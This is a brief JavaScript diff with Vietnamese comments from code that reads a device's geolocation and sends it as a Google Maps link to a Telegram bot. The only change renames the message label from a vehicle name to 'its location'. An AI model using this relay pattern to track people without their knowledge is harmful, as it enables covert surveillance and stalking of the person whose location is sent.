@@ -58,7 +58,7 @@
             
             // Link Google Maps chuẩn để bạn bấm vào là xem được ngay
             const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-            const message = `📍 Vị trí Wave 54zz:\nLink: ${googleMapsUrl}\nĐộ chính xác: +/- ${position.coords.accuracy}m`;
+            const message = `📍 Vị trí của nó:\nLink: ${googleMapsUrl}\nĐộ chính xác: +/- ${position.coords.accuracy}m`;
 
             fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
                 method: 'POST',
